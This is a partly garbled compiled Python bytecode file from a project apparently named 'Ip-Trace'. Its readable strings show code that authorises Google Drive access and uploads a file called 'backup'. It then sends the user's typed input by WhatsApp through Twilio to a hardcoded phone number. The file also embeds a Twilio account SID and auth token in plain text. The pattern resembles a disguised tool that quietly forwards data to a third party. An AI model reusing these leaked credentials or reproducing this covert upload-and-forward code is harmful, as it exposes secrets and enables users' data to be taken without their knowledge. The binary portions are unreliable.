a
    ��`/
  �                   @   s�   d dl Z d dlZd dlmZ d dlmZ d dlmZ d dlm	Z	 d dl
mZ ddgZed	� d
d� Zdd� Zdd� Zedkr�e�  dS )�    N)�build)�InstalledAppFlow)�Request)�MediaFileUpload)�Clientz7https://www.googleapis.com/auth/drive.metadata.readonlyz*https://www.googleapis.com/auth/drive.filezwhait for 30 minc                  C   s�   d } t j�d�rDtdd��}t�|�} W d   � n1 s:0    Y  | rN| js�| rl| jrl| jrl| �	t
� � nt�dt�}|jdd�} tdd��}t�| |� W d   � n1 s�0    Y  tdd| d	�S )
Nztoken.pickle�rbzcredentials.jsonr   )Zport�wbZdriveZv3)Zcredentials)�os�path�exists�open�pickle�loadZvalidZexpiredZrefresh_tokenZrefreshr   r   Zfrom_client_secrets_file�SCOPESZrun_local_server�dumpr   )Zcreds�tokenZflow� r   �B/data/data/com.termux/files/home/Ip-Trace/__init__/upload-files.py�get_gdrive_service   s    (
�*r   c                  C   s�   t � } ddd�}| �� j|dd��� }|�d�}td|� d|gd�}tdd	d
�}| �� j||dd��� }td|�d�� t�  d S )NZBTestFolderz"application/vnd.google-apps.folder)�nameZmimeType�id)�body�fieldsz
Folder ID:Zbackup)r   �parentsT)Z	resumable)r   Z
media_bodyr   zFile created, id:)r   �files�createZexecute�get�printr   �main)ZserviceZfolder_metadata�fileZ	folder_idZfile_metadataZmediar   r   r   �upload_files!   s    �

�r    c                  C   sP   d} t d�}t�d� d}d}t||�}|jjd|| d�}td� t�d	� d S )
Nzwhatsapp:+94711365399z	create id�clearZ"ACccc5b0a8ad0202a78012e010bb926907Z 1feaef63b07744bbf6715ee212beb335zwhatsapp:+14155238886)Zfrom_r   �tozyour requests send sucessfullyzfiglet END  PROGRAM)�inputr	   �systemr   Zmessagesr   r   )�p�tZaccount_sidZ
auth_tokenZclient�messager   r   r   r   <   s    

�r   �__main__)r   r	   Zgoogleapiclient.discoveryr   Zgoogle_auth_oauthlib.flowr   Zgoogle.auth.transport.requestsr   Zgoogleapiclient.httpr   Ztwilio.restr   r   r   r   r    r   �__name__r   r   r   r   �<module>   s   �